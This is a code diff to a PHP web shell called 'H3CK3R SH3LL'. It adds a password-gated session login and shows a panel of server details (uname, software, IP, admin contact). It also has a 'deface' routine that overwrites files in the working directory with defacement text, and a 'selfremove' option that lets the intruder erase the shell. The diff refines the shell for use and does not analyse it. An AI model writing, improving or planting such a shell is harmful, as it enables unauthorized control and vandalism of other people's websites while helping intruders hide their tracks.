@@ -1,9 +1,12 @@
 <?php
+/*************
 # H3CK3R SH3LL
+# Made by: @It0sh1
+# Github: 
+**************/
 
 // start the session
 session_start();
-error_reporting(0);
 
 // The author of the webshell.
 const Author = "It0sh1";
@@ -21,6 +24,10 @@ $server_ip = gethostbyname($_SERVER['HTTP_HOST']);
 $site_protocol = $_SERVER['SERVER_PROTOCOL'];
 $administrator = $_SERVER['SERVER_ADMIN'];
 
+if(isset($_POST['default_pass']) && $_POST['default_pass'] == $default_pass) {
+	$_SESSION["login"] = true;
+	header("location: ?");
+}
 
 if(!isset($_SESSION["login"])) {
 	echo "<center style='
@@ -32,65 +39,48 @@ if(!isset($_SESSION["login"])) {
 	</form>
 	<i>Coded by: " . Author . "</i>
 	</center>";
+	die();
 }
-if($_POST['default_pass'] == $default_pass) {
-	$_SESSION["login"] = 1;
-	$isloggedin = true;
-	header("location: ?");
-} else {
-	// The shell panel
-	if(isset($_SESSION['login'])) {
-		echo "<!DOCTYPE html>
-		<html><head>
+// The shell panel
+if(isset($_SESSION['login'])) {
+	echo "<!DOCTYPE html>
+	<html>
+	    <head>
 		    <title>H3CK3R SH3LL " . Version . "</title>
 		</head>
 		<body style='background: #143540;'>
-		<center><h1 style='color: #fff;'>H3CK3R SH3LL</h1><hr /></center>
-		<code style='color: #fff;'><p>Uname: <b>" . $uname . "</b><br />
-		Software: <b>" . $server_software . "</b><br />
-		Server IP: <b>" . $server_ip . " | " . $_SERVER['REMOTE_ADDR'] ."</b><br />
-		Site Protocol: <b>" . $site_protocol . "</b><br />
-		Server Admin: <b>" . $administrator . "</b><br />
-		mysql version: <b>" . $test . "</b></p></code>
-		<center>
-		<hr />
-		<bar>
-		<ul><b>
-		    <li class='pages'><a href='webshell.php'>Home</a></li>
-			<li class='pages'><a name='exec' href='webshell.php?exec=deface'>deface</a></li>
-			<li class='pages'><a name='link' href='webshell.php?link=logout'>logout</a></li>
-			<li class='pages'><a name='exec' href='webshell.php?exec=selfremove'>selfremove</a></li>
-		</ul></b>
-		</bar>
-		<hr />
-		</center>
-		<style>
-        body {
-			color: #fff;
-		}
-        bar {
-	        position:relative;
-	        text-align: center;
-        }
-        .pages a {
-	        text-decoration: none;
-	        transition: color 1s;
-	        color: #fff;
-        }
-        .pages {
-	        display:inline;
-	        padding:20px;
-	        font-size:16px;
-            transition: color 1s;
-        }
-    </style>
+		    <center><h1 style='color: #fff;'>H3CK3R SH3LL</h1><hr /></center>
+		        <code style='color: #fff;'>
+				    Uname: <b>" . $uname . "</b><br />
+		            Software: <b>" . $server_software . "</b><br />
+		            Server IP: <b>" . $server_ip . " | " . $_SERVER['REMOTE_ADDR'] ."</b><br />
+		            Site Protocol: <b>" . $site_protocol . "</b><br />
+		            Server Admin: <b>" . $administrator . "</b><br />
+				</code>
+		    <center>
+		    <hr />
+		    <bar>
+		        <ul>
+		            <li class='pages'><a href=".basename($_SERVER['PHP_SELF'])."/><b>Home</b></a></li>
+			        <li class='pages'><a href=".basename($_SERVER['PHP_SELF'])."?exec=deface><b>deface</b></a></li>
+			        <li class='pages'><a href=".basename($_SERVER['PHP_SELF'])."?link=logout><b>logout</b></a></li>
+			        <li class='pages'><a href=".basename($_SERVER['PHP_SELF'])."?exec=selfremove><b>selfremove</b></a></li>
+		        </ul>
+		    </bar>
+		    <hr />
+		    </center>
+		    <style>
+                body { color: #fff; }
+                bar { position:relative; text-align: center; }
+                .pages a { text-decoration: none; transition: color 1s; color: #fff; }
+                .pages { display:inline; padding:20px; font-size:16px; transition: color 1s; }
+            </style>
 		</body>
-		</html>";
-	}
+	</html>";
 }
 
 // For the deface section. 
-if($_GET['exec'] == "deface"){
+if(isset($_GET['exec']) && $_GET['exec'] == "deface"){
 	
 	// Get the dir.
 	$base_dir = getcwd();
@@ -115,18 +105,16 @@ if($_GET['exec'] == "deface"){
 		if(!file_exists($filename)){
 			$toFile = fopen($filename, 'a');
 			fwrite($toFile, $deface_text);
-			move_uploaded_file($deface_place);
 		}
 		else {
 			$current = file_get_contents($filename);
 			file_put_contents($filename, $deface_text);
-			move_uploaded_file($deface_place);
 		}
 	}
 }
 
 // Self remove function.
-if($_GET['exec'] == "selfremove"){
+if(isset($_GET['exec']) && $_GET['exec'] == "selfremove"){
 	// Self remove button.
 	echo "<center style='margin-top: 50px;'>
 	<form method='post' action=''>
@@ -144,9 +132,9 @@ if($_GET['exec'] == "selfremove"){
 }
 
 // Logout script function
-if($_GET['link'] == "logout"){
+if(isset($_GET['link']) && $_GET['link'] == "logout"){
 	session_start();
 	session_destroy();
-	header("location: webshell.php");
+	header("location: " . basename($_SERVER['PHP_SELF']));
 }
 ?>
